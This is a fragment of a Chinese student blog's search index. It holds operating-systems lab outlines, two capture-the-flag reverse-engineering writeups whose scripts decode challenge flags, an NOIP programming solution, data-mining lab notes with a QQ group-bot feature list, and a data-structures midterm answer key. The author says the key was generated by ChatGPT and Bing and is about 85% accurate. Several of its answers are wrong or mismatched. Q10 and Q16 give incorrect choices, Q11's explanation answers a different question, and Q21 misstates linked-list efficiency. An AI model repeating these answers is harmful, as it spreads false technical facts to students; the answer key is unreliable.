all\n运行\n编译process\n\n\n\n编辑Python脚本\n\n\n\n","categories":["QFNU","操作系统","实验报告"],"tags":["QFNU","操作系统"]},{"title":"操作系统实验5——基于内核栈切换的进程切换","url":"/posts/d7e85c03.html","content":"解压环境\n编辑 kernel&#x2F;sched.c\n\n\n编辑 include&#x2F;linux&#x2F;sched.c\n编辑 kernel&#x2F;system_call.s\n编辑 include&#x2F;linux&#x2F;sched.h\n\n\n编辑 kernel&#x2F;sched.c\n编辑 kernel&#x2F;system_call.s\n编辑 kernel&#x2F;fork.c\n编辑 kernel&#x2F;system_call.s\n\n编辑 kernel&#x2F;system_call.s\n编辑 kernel&#x2F;fork.c\n编译\n运行\n","categories":["QFNU","操作系统","实验报告"],"tags":["QFNU","操作系统"]},{"title":"操作系统实验6——信号量的实现与应用","url":"/posts/8b28bf01.html","content":"解压环境\n创建并编辑 pc.c\n创建并编辑 sem.h\n创建并编辑 sem.c\n编辑 unistd.h\n编辑 system_call.s\n编辑 sys.h\n编辑 makefile\n\n后续操作cp 命令 | 复制操作\n编译\n运行\n编译\n挂载\n","categories":["QFNU","操作系统","实验报告"],"tags":["QFNU","操作系统"]},{"title":"操作系统实验7——地址映射与共享","url":"/posts/8263a7da.html","content":"解压环境\n编译内核\n创建 test.c\n调试\n\n\n\n\n\n\n\n\n\n编辑 sys.h、unistd.h\n\n编辑 system_call.s\n创建编辑 shm.c\n编辑 MakeFile\n编辑 sem.h\n创建 producer.c、consumer.c\n\n后续步骤\n\n\n\n","categories":["QFNU","操作系统","实验报告"],"tags":["QFNU","操作系统"]},{"title":"攻防世界-Reverse-666writeup","url":"/posts/117d354d.html","content":"查壳丢进去查壳\n\n无壳\n进入IDA直接拉进ida\n 首先看到一个比较醒目的flag\n\n但是这怎么可能就是答案呢\n主函数看一下主函数\n\n双击enflag看一下\n 发现enflag是izwhroz””w”v.K”.Ni\n转化为十进制ASCII文本，十六进制，二进制，十进制，Base64转换器 (rapidtables.org)\n[105,122,119,104,114,111,122,34,34,119,34,118,46,75,34,46,78,105]\n\nkey的长度是12h（注意是16进制），转换成十进制应该是10\nencode函数返回主函数看一下encode是干啥的\n\n 根据三行重点计算过程，写一下逆向代码\n#include &lt;iostream&gt;#include &lt;vector&gt;#include&lt;Windows.h&gt;using namespace std; int main()&#123;    string v3=&quot;&quot;; // [rsp+10h] [rbp-70h]    int v4; // [rsp+78h] [rbp-8h]    int i; // [rsp+7Ch] [rbp-4h]    i = 0;    v4 = 0;    vector&lt;int&gt; enflag = &#123; 105,122,119,104,114,111,122,34,34,119,34,118,46,75,34,46,78,105,0 &#125;;    for (i = 0; i &lt; 18; i += 3)    &#123;        v3 += char((18 ^ enflag[i]) - 6);        v3 += char((18 ^ enflag[i + 1]) + 6);        v3 += char(18 ^ enflag[i + 2] ^ 6);    &#125;    cout &lt;&lt; v3 &lt;&lt; endl;    return 0;&#125; \n\nunctf{b66_6b6_66b}\n","categories":["CTF","WP","RE"],"tags":["CTF"]},{"title":"数字统计","url":"/posts/2e9ca8cf.html","content":"[NOIP2010 普及组] 数字统计题目描述请统计某个给定范围 $[L, R]$ 的所有整数中，数字 $2$ 出现的次数。\n比如给定范围 $[2, 22]$，数字 $2$ 在数 $2$ 中出现了 $1$ 次，在数 $12$ 中出现 $1$ 次，在数 $20$ 中出现 $1$ 次，在数 $21$ 中出现 $1$ 次，在数 $22$ 中出现 $2$ 次，所以数字 $2$ 在该范围内一共出现了 $6$ 次。\n输入格式$2$ 个正整数 $L$ 和 $R$，之间用一个空格隔开。\n输出格式数字 $2$ 出现的次数。\n样例 #1样例输入 #12 22\n\n样例输出 #16\n\n样例 #2样例输入 #22 100\n\n样例输出 #220\n\n提示$1 ≤ L ≤R≤ 100000$。\nNOIP2010 普及组 第一题\n题解a, b = map(int, input().split())count = 0for i in range(a, b + 1):    i_str = str(i)    for j in i_str:        num_str = int(j)        if num_str == 2:            count += 1print(count)\n\n\n\n题解解释这段代码实现了统计给定范围 $[a, b]$ 中数字 $2$ 出现的次数。首先通过 input().split() 获取用户输入的两个整数，然后通过 map(int, ...) 将输入的字符串转换为整数，并将其分别赋值给变量 a 和 b。接着初始化计数变量 count 为 $0$。\n然后通过 for i in range(a, b + 1): 循环遍历范围 $[a, b]$ 中的每一个整数。在循环中，将当前整数 i 转换为字符串 i_str，然后通过 for j in i_str: 遍历该字符串的每一位数字。将每一位数字转换为整数 num_str，如果 num_str 等于 $2$，则将 count 自增 $1$。\n最后输出 count，即范围 $[a, b]$ 中数字 $2$ 出现的总次数。\n知识点提取整数中每一个数字要提取一个整数中的每一位数字，你可以使用 Python 将其转换为字符串，然后逐个访问每个字符。下面是一个简单的示例：\ndef extract_digits(number):    # 将数字转换为字符串    number_str = str(number)        # 遍历字符串中的每个字符    for digit_char in number_str:        # 如果字符是数字字符，则转换为整数并打印        if digit_char.isdigit():            digit = int(digit_char)            print(digit)# 调用函数并传入整数extract_digits(123456)\n\n这将输出：\n123456\n\n这里我们将整数转换为字符串，然后遍历字符串的每个字符，将每个字符再转换回整数以获取每一位数字。\nchr 和 str 函数，我搞混了还要注意 chr 和 str 函数，我搞混了\n在 Python 中，chr() 和 str() 是两个不同的函数，用途也不同。\n\nchr(): 这个函数接受一个整数参数，并返回对应的 ASCII 或 Unicode 字符。例如，chr(65) 将返回字符’A’，chr(97) 将返回字符’a’。\n\nprint(chr(65))  # 输出: Aprint(chr(97))  # 输出: a\n\n\nstr(): 这个函数用于将对象转换为字符串。它可以接受任何类型的参数，并返回其字符串表示形式。对于数字，它会将数字转换为相应的字符串；对于其他对象，它会调用对象的 __str__() 方法来获取字符串表示形式。\n\nprint(str(65))  # 输出: &#x27;65&#x27;print(str(3.14))  # 输出: &#x27;3.14&#x27;print(str([1, 2, 3]))  # 输出: &#x27;[1, 2, 3]&#x27;\n\n所以，chr() 函数是将整数转换为字符，而 str() 函数是将任意对象转换为字符串。\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"攻防世界-Reverse-easyxorwriteup","url":"/posts/c57101a0.html","content":"查壳无壳\n反编译拉进漂亮姐姐中（IDA）\nshift+F12看一下字串\n\n首先看到一个关键信息，点进去，Ctrl+x交叉引用\n\nF5看一下伪代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  char v4; // al  int v5; // eax  char v7; // [rsp+33h] [rbp-Dh]  char v8; // [rsp+33h] [rbp-Dh]  int v9; // [rsp+34h] [rbp-Ch]  int i; // [rsp+38h] [rbp-8h]  int v11; // [rsp+3Ch] [rbp-4h]  _main();  v11 = 0;  v9 = 0;  puts(&quot;Please input your flag:&quot;);  while ( 1 )  &#123;    v8 = getchar();    if ( v8 == 10 )      break;\tv7 = key[v9 % 4] ^ v8;\t\t\t//输入的字符，进行异或操作，得到v7    while ( 1 )\t\t\t\t\t\t    &#123;      v4 = v7--;\t\t\t\t\t//循环v7次      if ( v4 &lt;= 0 )\t\t\t\t//此while循环是向s[]中输入v7个1        break;      v3 = v11++;      s[v3] = 1;    &#125;    v5 = v11++;\t\t\t\t\t\t//输出v7个1后，使用0与下一串1隔开\t    s[v5] = 0;\t\t\t\t\t\t    ++v9;  &#125;  while ( v11 &lt;= 2559 )\t\t\t\t//输入的字符全部转化为1之后，不够2559个的话填充-1（255）    s[v11++] = -1;  for ( i = 0; i &lt;= 2559; ++i )  &#123;    if ( r[i] != s[i] )\t\t\t\t//进行比较    &#123;      puts(&quot;Lose lose lose!&quot;);      break;    &#125;  &#125;  if ( i == 2560 )    puts(&quot;Win win win!&quot;);  system(&quot;pause&quot;);  return 0;&#125;\n\n其中r是\nr = [0x35, 0x2F, 0x2F, 0x32, 0x28, 0x14, 0x27, 0x3B, 0x3D, 0x70,     0x3C, 0x0A, 0x3D, 0x73, 0x3A, 0x0A, 0x1F, 0x73, 0x3D, 0x66,     0x21, 0x1C, 0x6D, 0x28]\n\nkey是SCNU\n解密写一下解密python\nr = [0x35, 0x2F, 0x2F, 0x32, 0x28, 0x14, 0x27, 0x3B, 0x3D, 0x70,     0x3C, 0x0A, 0x3D, 0x73, 0x3A, 0x0A, 0x1F, 0x73, 0x3D, 0x66,     0x21, 0x1C, 0x6D, 0x28]key = &quot;SCNU&quot;flag=&#x27;&#x27;for i in range(len(r)):    flag+=chr(ord(key[i % 4]) ^ r[i])print(flag)\n\nFLAGflag&#123;Winn3r_n0t_L0s3r_#&#125;\n\n","categories":["CTF","WP","RE"],"tags":["CTF"]},{"title":"数据挖掘实验1——Python环境搭建及基础练习","url":"/posts/45db3590.html","content":"实验环境搭建\n配置镜像源\n我一般直接是挂代理安装 pip 包，这里防止我本地环境搞乱不配置了，上面是 conda 的信息\n代码有现成的自己暑假写的项目，直接交了。\n基于 Python 和 OneBot 11 的 QQ 机器人实现\n开源地址：W1ndys-bot&#x2F;W1ndys-bot: 基于 Python 和 OneBot 11 的 QQ 机器人实现 (github.com)\n解释一下代码结构\n根目录是放的一些常用的批处理脚本、docker-compose 索引文件、Git 配置文件、以及 pip 环境依赖索引文件\n核心代码在 app 路径之下\n\napp/main.py 是程序入口，是启动文件\napp/menu.py 是菜单文件\napp/secret.py 是秘钥存放文件\napp/switch.py 是开关文件\napp/config.py 是配置文件\napp/bot.py 是机器人接收消息的核心代码\napp/data 是数据存放目录\napp/hanndle_event.py 是处理事件的核心代码\napp/scripts 是所有功能模块的存放目录\napp/api.py 是所有 API 的存放目录\n\n功能演示\n\n代码已实现功能系统\n机器人连接成功通知到 root 管理员 QQ\n机器人断开通知到钉钉\n机器人断线自动重连\n菜单\n\n群发消息\n群发消息，私聊 bot\n\n\n群发消息\n添加群\n删除群\n查看群\n\n群管系统\n禁言\n禁言自己\n禁言指定用户\n禁言随机用户\n禁言指定用户指定秒\n禁言随机用户随机秒\n解禁\n踢人\n撤回消息\n撤回指定消息\n扫描邀请链\n添加违禁词\n移除违禁词\n列出违禁词\n启用违禁词检测\n禁用违禁词检测\n启用入群欢迎信息\n禁用入群欢迎信息\n启用邀请链功能\n禁用邀请链功能\n查看邀请链\n\n邀请链记录\n记录用户通过邀请链进入群聊的情况，并记录用户 QQ 号和入群时间，当有群内广告时，可以递归遍历邀请链，找到所有相关用户，不仅可以搜父子关系，还可以搜兄弟关系\n例如：A 邀请 B 进入群聊，B 又邀请 C 进入群聊，C 又邀请 D 进入群聊，那么邀请链就是 A -&gt; B -&gt; C -&gt; D\n再例如：A 邀请 B 和 C，B 邀请 D，C 邀请 E，那么邀请链就是 A -&gt; B -&gt; D 和 A -&gt; C -&gt; E，当 E 发送了违规广告时，可以递归遍历邀请链，找到 A、B、C、D、E 所有相关用户\n\n\n开启邀请链记录\n关闭邀请链记录\n查看邀请链记录\n\n黑名单系统\n黑名单系统，可以对指定用户进行拉黑，拉黑后，用户将会被踢出群聊，并且拒绝该用户再次进入群聊\n支持艾特添加，支持 QQ 号添加\n\n\n添加黑名单\n删除黑名单\n列出黑名单\n禁用黑名单\n启用黑名单\n\n群名片锁\n群名片锁，可以对指定用户进行群名片锁定，锁定后，用户将会被锁定在当前群名片，若发现用户修改群名片，将会重新锁定\n\n\n修改群名片\n添加群名片锁\n删除群名片锁\n禁用群名片锁\n启用群名片锁\n\n软封禁系统\n指不禁言，但是会撤回每条消息\n\n\n添加软封禁\n删除软封禁\n查看本群软封禁\n\n关键词回复\n关键词回复，当用户发送了关键词时，机器人将会回复指定内容\n\n\n添加关键词回复\n删除关键词回复\n查看关键词回复\n批量添加关键词回复\n\n知识库问答系统\n知识库问答系统，引入了 jieba 分词和 Levenshtein 距离算法，支持关键词识别，问题识别，可以实现模糊匹配，支持批量添加知识库\n数据量越大，匹配结果越准确\n\n\n开启知识库\n关闭知识库\n添加知识库\n删除知识库\n查看知识库\n批量添加知识库\n\nCrypto编解码系统\n\n支持私聊编解码\n支持群聊编解码\nbase64 编解码\nMD5 编码\n进制转换\nhash 计算\n密码生成\n\nTools\n工具系统，提供一些常用的工具功能，主要以接入第三方 API 为主\n\n\nIP 地址查询\n快递查询\n\n曲阜师范大学网站监控\n曲阜师范大学网站监控，每五分钟检查一次，当教务处和资产处网站有更新时，会通知到开启的群聊\n\n\n教务处监控\n资产处监控\n\n","categories":["数据挖掘","实验报告"],"tags":["数据挖掘"]},{"title":"数据挖掘实验2——数据可视化","url":"/posts/3110e11b.html","content":"实验目的\n学习使用 Python 中的 Matplotlib 包进行数据可视化。\n\n实验仪器与设备\n计算机 1 台\n配置好的 python 环境\n\n实验内容\n根据实验文献，以车辆燃油消耗数据集为基础，进行数据可视化学习。\n基于 Iris 数据集进行可视化分析练习。根据所学知识从多角度用不同的图表进行可视化。\n\n实验步骤\n学习教师所给的资料。\n编程实现实验内容。\n\n提交要求\n按照学院的实验报告模板，撰写实验报告，实验报告格式见最下方，命名规则：学号-姓名-实验二-数据挖掘实验报告。\n附上实验代码，导出为.py 的文件上传。\n实验发布及提交平台：知心教管平台。\n\n实验代码import matplotlib.pyplot as pltimport seaborn as snsimport pandas as pd# 加载数据data = pd.read_csv(&quot;iris/iris.csv&quot;)# 创建一个图形框架，设置大小plt.figure(figsize=(20, 12))# 子图1: 条形图plt.subplot(3, 3, 1)sns.barplot(x=&quot;Species&quot;, y=&quot;Sepal.Length&quot;, data=data)plt.title(&quot;Sepal Length by Species&quot;)# 子图2: 饼图plt.subplot(3, 3, 2)data[&quot;Species&quot;].value_counts().plot.pie(autopct=&quot;%1.1f%%&quot;)plt.title(&quot;Species Distribution&quot;)plt.ylabel(&quot;&quot;)  # 移除y标签# 子图3: 直方图plt.subplot(3, 3, 3)sns.histplot(data[&quot;Sepal.Length&quot;], kde=False)plt.title(&quot;Sepal Length Histogram&quot;)# 子图4: 核密度图plt.subplot(3, 3, 4)sns.kdeplot(data[&quot;Sepal.Length&quot;], shade=True)plt.title(&quot;Sepal Length KDE&quot;)# 子图5: 箱形图plt.subplot(3, 3, 5)sns.boxplot(x=&quot;Species&quot;, y=&quot;Sepal.Length&quot;, data=data)plt.title(&quot;Sepal Length Boxplot by Species&quot;)# 子图6: 散点图plt.subplot(3, 3, 6)sns.scatterplot(x=&quot;Sepal.Length&quot;, y=&quot;Sepal.Width&quot;, hue=&quot;Species&quot;, data=data)plt.title(&quot;Sepal Length vs Sepal Width&quot;)# 子图7: 折线图plt.subplot(3, 3, 7)sns.lineplot(x=&quot;Petal.Length&quot;, y=&quot;Petal.Width&quot;, hue=&quot;Species&quot;, data=data)plt.title(&quot;Petal Length vs Petal Width&quot;)# 调整子图间距plt.tight_layout()plt.show()\n"},{"title":"数据结构期中考试wp","url":"/posts/c0eaf0d7.html","content":"\n以下内容全部来自ChatGPT和Microsoft bing ai解答，正确率为85%左右，仅参考，本人对本页答案概不负责\n\n一、选择题\n对于数据结构的描述，下列说法中不正确的是( )。\n\n相同的逻辑结构对应的存储结构也必相同\n数据结构由逻辑结构、存储结构和基本操作三方面组成\n对数据结构基本操作的实现与存储结构有关\n数据的存储结构是数据的逻辑结构的机内实现\n\n选项 A 是不正确的。相同的逻辑结构并不意味着存储结构也必须相同。逻辑结构是数据对象之间的抽象关系，而存储结构是这些关系在计算机内部的具体表示。例如，线性表的逻辑结构可以通过数组（顺序存储结构）或链表（链式存储结构）来实现，这两种存储结构有着不同的特性和操作复杂性。因此，即使逻辑结构相同，存储结构也可以不同。其他选项 B、C 和 D 都是正确的。数据结构确实由逻辑结构、存储结构和基本操作三方面组成（B），对数据结构基本操作的实现确实与存储结构有关（C），数据的存储结构是数据的逻辑结构的机内实现（D）。\n\n\n顺序存储结构中数据元素之间的逻辑关系是由（ ）表示的。\n\n线性结构\n非线性结构\n存储位置\n指针\n\n在顺序存储结构中，数据元素之间的逻辑关系是由存储位置表示的。所以正确答案是选项 C。在顺序存储结构中，元素之间的逻辑关系（例如线性关系）通过它们在内存中的物理位置来表示。相邻的元素在内存中也是相邻的。这与链式存储结构不同，在链式存储结构中，元素之间的逻辑关系是通过指针表示的。选项 A 和 B 描述的是数据结构的类型，而不是数据元素之间的逻辑关系如何表示。选项 D 是链式存储结构中数据元素之间逻辑关系的表示方式，而不是顺序存储结构。\n\n\n链接存储结构中数据元素之间的逻辑关系是由( )表示的。\n\n线性结构\n非线性结构\n存储位置\n指针\n\n在链接存储结构中，数据元素之间的逻辑关系是由指针表示的。指针指向了下一个数据元素的位置，从而建立了数据元素之间的联系。\n因此，选项 D 是正确的。\n\n\n算法指的是( )。\n\n对特定问题求解步骤的一种描述,是指令的有限序列\n计算机程序\n解决问题的计算方法\n数据处理\n\n算法指的是对特定问题求解步骤的一种描述，是指令的有限序列。它是解决问题或执行任务的明确指令集合，旨在通过一系列定义明确的步骤来完成特定任务。算法通常是一系列可执行的操作，能够从初始状态转移到所需的最终状态。\n因此，选项 A 是正确的。\n\n\n假设时间复杂度为O（n^2）的算法在有200个元素的数组上运行需要3.1 ms，则有400个元素的数组上运行需要(   )ms。\n\n3.1\n6.2\n12.4\n9.61\n\n根据时间复杂度为 O(n^2) 的算法特点，当数组元素的数量增加一倍时，运行时间将增加为原来的平方倍。因此，200 个元素变为 400 个元素，相当于增加了一倍。根据这个关系，我们可以预计运行时间将是原来的 2^2 &#x3D; 4 倍。即 3.1 ms * 4 &#x3D; 12.4 ms。\n因此，有 400 个元素的数组上运行时间将是 12.4 ms。选项 C 中的 12.4 是正确的。\n\n\n算法分析的两个主要方面是( )。\n\n空间性能和时间性能\n正确性和简明性\n可读性和文档性\n数据复杂性和程序复杂性\n\n算法分析的两个主要方面是空间性能和时间性能。在算法设计和评估过程中，我们通常关注算法所需的内存空间以及它执行所需的时间。这些指标可以帮助我们评估算法的效率和可行性，从而选择最适合特定问题的算法。\n因此，选项 A 是正确的。\n\n\n下面( )不是算法所必须具备的特性。\n\n有穷性\n确切性\n高效性\n可行性\n\n从定义上讲，算法必须具备“有穷性”、“确切性”和“可行性”，因为算法必须是能够在有限步骤内完成的、每个步骤都必须确切且无歧义，并且必须是可行实施的。因此，这些特性是算法的基本要求。\n然而，“高效性”并非是算法必须具备的特性。尽管我们通常希望算法是高效的，但并非所有算法都需要是最高效的。因此，选项 C 中的“高效性”是不是算法所必须具备的特性。\n\n\n链表不具有的特点是( )。\n\n可随机访问任一元素\n插入删除不需要移动元素\n不必事先估计存储空间\n所需空间与线性表长度成正比\n\n链表不具备的特点是可随机访问任一元素。链表中的元素并非按照其在内存中的物理位置顺序存储，因此不能像数组那样通过下标直接访问特定位置的元素。如果要访问链表中的某个特定元素，需要从头节点开始遍历链表直到找到该元素。\n因此，选项 A 中的“可随机访问任一元素”是链表不具备的特点。\n\n\n线性表采用链接存储时，其地址( )。\n\n必须是连续的\n部分地址必须是连续的\n一定是不连续的\n连续与否均可以\n\n线性表采用链接存储时，其地址可以是不连续的。在链接存储结构中，元素之间并不要求在物理内存中是连续存储的，相邻元素之间通过指针进行连接。这使得链表结构能够动态地分配和释放内存，避免了因为插入或删除操作导致的大量数据移动。\n因此，选项 D 中的“连续与否均可以”是正确的。\n\n10.循环单链表的主要优点是( )。\n不再需要头指针了\n从表中任一结点出发都能扫描到整个链表\n已知某个结点的位置后,能够容易找到它的直接前趋\n在进行插入、删除操作时，能更好地保证链表不断开\n\n循环单链表的主要优点是在进行插入、删除操作时，能更好地保证链表不断开。循环单链表的尾节点指向头节点，形成一个闭环，这使得在进行插入和删除操作时更加方便，因为不需要处理头尾节点的特殊情况。\n因此，选项 D 中的“在进行插入、删除操作时，能更好地保证链表不断开”是循环单链表的主要优点。\n\n11.若线性表中最常用的操作是在最后一个结点之后插入一个节点和删除最后一个结点，则采用( )存储方法最节省时间。\n单链表\n循环双链表\n单循环链表\n带尾指针的单循环链表\n\n循环单链表的主要优点是从表中任一结点出发都能扫描到整个链表。所以，正确答案是选项 B。在循环单链表中，最后一个元素的指针字段指向链表的第一个元素，形成一个闭环。这意味着我们可以从任何一个元素开始，通过顺序访问每个元素的指针字段，遍历整个链表。然而，循环单链表仍然需要头指针来标识链表的起始位置（选项 A 是错误的）。已知某个结点的位置后，找到它的直接前趋在单链表（包括循环单链表）中并不容易，因为我们只能从头开始遍历链表（选项 C 是错误的）。在进行插入、删除操作时，无论是单链表还是循环单链表，我们都需要确保操作后链表不会断开（选项 D 是错误的）。\n\n12.从栈顶指针为top的链栈中删除一个结点 ,用x保存被删除结点的值，则执行( )。\nx&#x3D;top; top&#x3D;top-&gt; next;\nx&#x3D;top-&gt; data;\ntop&#x3D;top-&gt; next; x&#x3D; top-&gt; data;\nx&#x3D;top-&gt; data; top&#x3D; top-&gt; next;\n\n在从栈顶指针为top的链栈中删除一个节点时，我们首先需要保存被删除节点的值，然后更新栈顶指针。栈顶指针需要指向被删除节点的下一个节点，因为栈是先进后出的数据结构，所以删除的是栈顶元素。\n因此，正确的操作是:\nx = top-&gt;data; // 保存被删除节点的值top = top-&gt;next; // 更新栈顶指针\n\n所以选项是D。\n\n13.设计一个判别表达式中左右扩号是否配对的算法,采用( )数据结构最佳。\n顺序表\n栈\n队列\n链表\n\n对于判别表达式中左右括号是否配对的算法，最适合使用的数据结构是栈。栈是一种后进先出（LIFO）的数据结构，可以用来检查括号是否匹配。具体的算法可以使用栈来存储左括号，并在遇到右括号时弹出相应的左括号进行匹配。\n因此，选项 B 中的栈是最佳的数据结构。\n\n14.将数组称为随机存取结构是因为（ ）。\n数组元素是随机的\n对数组任意元素的存取时间是相等的\n随时可以对数组进行访问\n数组的存储结构是不定的\n\n将数组称为随机存取结构是因为对数组任意元素的存取时间是相等的。这是因为数组在内存中是连续存储的，每个元素都可以通过偏移量直接计算出其地址，因此可以在 O(1) 的时间复杂度内访问任意索引处的元素。\n因此，选项 B 中的“对数组任意元素的存取时间是相等的”是描述数组作为随机存取结构的原因。\n\n15.设有两个字符串p和q，求p在q中首次出现的位置的运算称作（ ）。\n连接\n模式匹配\n求字串\n求串长\n\n求p在q中首次出现的位置的运算称为模式匹配。模式匹配是计算机科学中的一个重要概念，用于确定一个字符串是否包含另一个字符串作为子字符串，并返回其出现的位置。在这种情况下，给定字符串p和q，我们试图找到q中第一次出现p的位置。\n因此，选项 B 中的“模式匹配”是描述这种运算的术语。\n\n16.设栈S和队列Q的初始状态为空，元素e1，e2，e3，e4，e5，e6依次通过栈S，一个元素出栈后即进入队列Q。若6个元素出队列的顺序是e2，e4，e3，e6，e5，e1，则栈S的容量至少应该是( )。\n6\n4\n3\n2\n\n根据题意，元素首先通过栈 S，然后一个一个地出栈并进入队列 Q。最后出队列的元素顺序是 e2，e4，e3，e6，e5，e1。这意味着栈 S 中的元素在被进入队列 Q 之前必须按照逆序排列。\n因此，栈 S 的最小容量应至少是 6，因为栈 S 需要依次容纳 e1，e5，e6，e3，e4，e2 这 6 个元素。\n因此，选项 A 中的 6 是正确的。\n\n17.一个栈的入栈序列是1，2，3，4，5，则栈的不可能的输出序列是( )。\n54321\n45321\n43512\n12345\n\n对于给定的入栈序列1，2，3，4，5，栈的不可能的输出序列是 43512。这是因为在一个栈中，要取出一个元素，需要将位于栈顶的元素弹出，然后才能取出下一个元素。因此，输出序列中的第一个数字应该是栈中元素的最底部元素，然后逐渐依次向上取出。所以，顺序 4、3、5、1、2 不可能是给定入栈序列的输出序列。\n其他选项中的序列都是可能的栈输出序列，但 43512 不是。\n\n\n栈和队的主要区别在于（ ）。\n\n它们的逻辑结构不同\n它们的存储结构不同\n所包含的运算不同\n插入、删除运算的限定不一样\n\n栈和队列的主要区别在于它们的插入和删除运算的限定不同。栈是一种后进先出（LIFO）的数据结构，只允许在一端进行插入和删除操作，而队列是一种先进先出（FIFO）的数据结构，只允许在一端插入，在另一端删除。\n因此，选项 D 中的“插入、删除运算的限定不一样”是栈和队列的主要区别。\n\n\n设模式T&#x3D;“abcabc”，则该模式的next值为( )。\n\n{-1，0，0，1，2，3}\n{-1，0，0，0，1，2}\n{-1，0，0，1，1，2}\n{1，0，0，0，2，3}\n\n自己算算就行了，这题原本错了\n\n\n若一个栈的输入序列是1，2，3，… ,n,输出序列的第一个元素是n，则第 i个输出元素是( )。\n\n不确定\nn-i\nn-i-1\nn-i+1\n\n对于一个栈的输入序列是1，2，3，…，n，输出序列的第一个元素是n，则第 i 个输出元素是 n-i+1。这是因为栈是一种后进先出（LIFO）的数据结构，所以最后一个进入栈的元素会最先被弹出，倒数第二个进入栈的元素会第二个被弹出，以此类推。\n因此，选项 D 中的 n-i+1 是第 i 个输出元素的正确表示。\n\n21.设线性表有n个元素，以下操作中,( )在顺序表上实现比在单链表上实现的效率更高。\n输出第i(1≤i≤n)个元素值\n交换第1个和第2个元素的值\n顺序输出所有n个元素\n查找与给定值x相等的元素在线性表中的序号\n\n在顺序表和单链表上实现的效率比较如下：\n\n输出第i(1≤i≤n)个元素值：在顺序表上实现的效率更高。因为顺序表可以直接通过索引访问任何位置的元素，时间复杂度为O(1)。而在单链表中，我们需要从头开始遍历到第i个元素，时间复杂度为O(n)。\n交换第1个和第2个元素的值：在单链表上实现的效率更高。因为在单链表中，我们可以直接改变节点的链接，而不需要移动元素本身。而在顺序表中，我们需要移动元素本身，这可能涉及到大量的数据复制。\n顺序输出所有n个元素：在顺序表和单链表上实现的效率相同。因为无论是顺序表还是单链表，我们都需要遍历所有的元素，时间复杂度都是O(n)。\n查找与给定值x相等的元素在线性表中的序号：在顺序表和单链表上实现的效率相同。因为无论是顺序表还是单链表，我们都需要遍历所有的元素来查找给定值，时间复杂度都是O(n)。\n\n所以，在这些操作中，只有输出第i(1≤i≤n)个元素值这个操作在顺序表上实现比在单链表上实现的效率更高。\n\n22.对于n个元素组成的线性表,建立一个有序单链表的时间复杂度是( )。\n\n建立一个有序单链表的时间复杂度是O(n^2)。\n在一个有序单链表中插入一个元素需要在链表中找到合适的位置，这可能需要从头开始遍历链表，直到找到合适的位置为止。插入一个元素的平均时间复杂度为O(n)。如果要建立一个有序单链表，需要将n个元素一个个插入，因此总的时间复杂度为O(n) * O(n) &#x3D; O(n^2)。\n\n23.设数组S[n]作为两个栈S1和S2的存储空间，对任何一个栈只有当S[n]全满时才不能进行进栈操作。为这两个栈分配空间的最佳方案是( )。\nS1的栈底位置为0,S2的栈底位置为n-1\nS1的栈底位置为0,S2的栈底位置为n&#x2F;2\nS1的栈底位置为0,S2的栈底位置为n\nS1的栈底位置为0,S2的栈底位置为1\n\n为了最大限度地利用存储空间，我们应该将S1的栈底位置设置为0，将S2的栈底位置设置为n-1。这样可以使两个栈的空间分配在整个数组的两端，最大化利用数组的空间。所以最佳方案是：\nS1的栈底位置为0，S2的栈底位置为n-1。\n\n24.一个队列的入队顺序是1、2、3和4,则队列的输出顺序是( )。\n4321\n1234\n1432\n3241\n\n一个队列的特点是先进先出(FIFO)，即最先进入队列的元素最先出队列。根据题目给出的入队顺序，元素1首先进入队列，然后是2、3、4。因此，出队顺序应为1234。\n所以，队列的输出顺序是1234。\n\n25.对特殊矩阵采用压缩存储的目的主要是为了( )。\n表达变得简单\n对矩阵元素的存取变得简单\n去掉矩阵中的多余元素\n减少不必要的存储空间\n\n对特殊矩阵采用压缩存储的主要目的是为了减少不必要的存储空间。通过识别和利用矩阵中的特殊结构或特殊规律，可以使用更少的存储空间来表示矩阵，从而减少存储开销。这样可以节省存储空间，并降低存储和传输成本。\n\n26.在解决计算机主机与打印机之间速度不匹配问题时通常设置一个打印缓冲区，该缓冲区应该是一个( )结构。\n栈\n队列\n数组\n线性表\n\n在解决计算机主机与打印机之间速度不匹配问题时，通常设置一个打印缓冲区，该缓冲区应该是一个队列结构。\n使用队列结构可以保证打印作业按照先来先服务的原则进行处理。当打印机的处理速度慢于计算机主机的传输速度时，打印缓冲区可以暂时存储待打印的作业，然后按照顺序逐一传输到打印机进行打印。\n\n27.若某线性表中最常用的操作是取第i个元素和找第i个元素的前驱，则采用（ ）存储方法最节省时间。\n顺序表\n单链表\n双链表\n单循环链表\n\n若某线性表中最常用的操作是取第 i 个元素和找第 i 个元素的前驱，采用顺序表存储方法最节省时间。顺序表可以通过下标直接访问元素，时间复杂度为 O(1)，而单链表、双链表以及单循环链表在取第 i 个元素的操作中需要遍历至第 i 个节点，时间复杂度为 O(i)。因此，在此情况下，采用顺序表存储方法可以最节省时间。\n\n\n在一个单链表中，已知q所指结点是p所指结点的直接前驱，若在q和p之间插入s所指结点，则执行( )操作。\n\ns-&gt;next&#x3D;p-&gt;next; p-&gt; next&#x3D;s;\nq-&gt;next&#x3D;s; s-&gt;next&#x3D;p;\np-&gt;next&#x3D;s-&gt;next; s-&gt;next&#x3D;p;\np-&gt;next&#x3D;s; s-&gt;next&#x3D;q;\n\n在一个单链表中，已知 q 所指结点是 p 所指结点的直接前驱，若在 q 和 p 之间插入 s 所指结点，应执行以下操作：\nq-&gt;next&#x3D;s; s-&gt;next&#x3D;p;\n这样可以将 s 插入到 q 和 p 之间，完成链表的插入操作。\n\n29.关于矩阵压缩存储，下面的说法中，不正确的是( )。\n对称矩阵只需存放包括主对角线元素在内的下(或上)三角的元素即可\n对角矩阵只需存放非零元素即可\n稀疏矩阵中值为零的元素较多，因此可以采用三元组表方法存储\n稀疏矩阵中大量值为零的元素分布有规律，因此可以采用三元组表方法存储\n\n关于矩阵压缩存储，不正确的说法是：\n稀疏矩阵中大量值为零的元素分布有规律，因此可以采用三元组表方法存储。\n虽然稀疏矩阵中大量值为零的元素可以采用三元组表方法存储，但并不一定有规律。使用三元组表方法存储的目的是为了有效地表示稀疏矩阵，并且避免存储大量无效的零元素，而不是基于元素分布的规律。\n\n30.关于数组，下面的说法中，不正确的是( 